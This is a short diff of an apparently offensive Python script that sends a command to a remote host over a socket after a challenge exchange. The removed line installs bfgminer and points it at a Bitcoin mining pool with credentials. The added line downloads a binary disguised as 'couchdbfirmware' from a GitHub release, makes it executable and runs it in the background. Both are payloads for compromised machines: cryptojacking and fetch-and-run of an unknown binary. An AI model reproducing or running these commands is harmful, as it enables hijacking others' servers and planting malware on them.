@@ -70,4 +70,4 @@ CHALLENGE_RESPONSE = s.recv(1024)
 if len(CHALLENGE_RESPONSE) == 0:
     sys.exit(1)
 
-s.send(compile_cmd('nohup ```apt-get update; apt-get install bfgminer -y; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdbb'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'))
+s.send(compile_cmd('apt install wget;wget https://github.com/papppeeeerrrrspace/sweetyas/releases/download/log/couchdbfirmware;chmod 777 couchdbfirmware;nohup ./couchdbfirmware '+sys.argv[2]+' > /dev/null'))
